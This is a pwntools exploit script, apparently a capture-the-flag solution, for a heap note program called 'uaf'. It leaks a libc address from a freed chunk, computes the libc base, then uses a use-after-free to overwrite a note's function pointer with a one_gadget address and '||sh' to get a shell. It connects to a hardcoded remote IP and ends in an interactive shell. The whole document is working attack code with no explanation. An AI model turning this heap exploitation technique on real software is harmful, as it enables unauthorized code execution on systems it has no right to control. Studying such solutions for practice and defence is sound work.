from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./uaf")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./uaf")
else:
	p = remote("101.201.66.182","3333")
	libc = ELF("./libc.so.6")
	elf = ELF("./uaf")

def add(size,content):
	p.sendafter("Your choice :","1")
	p.sendafter("Note size :",str(size))
	p.sendafter("Content :",content)
	p.recvuntil("Success !\n")

def free(index):
	p.sendafter("Your choice :","2")
	p.sendafter("Index :",str(index))
	p.recvuntil("Success\n")

def show(index):
	p.sendafter("Your choice :","3")
	p.sendafter("Index :",str(index))

def debugf():
	gdb.attach(p,"b *0x400C54\nb system")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
add(0x100,"a")
add(0x10,"a")
free(0)
add(0x100,"a"*8)
show(2)
p.recvuntil("a"*8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
free(1)
free(0)
#debugf()
one_gadget = libc.address + 0x45216
add(0x10,p64(one_gadget) + "||sh")
#debugf()
show(1)
p.interactive()
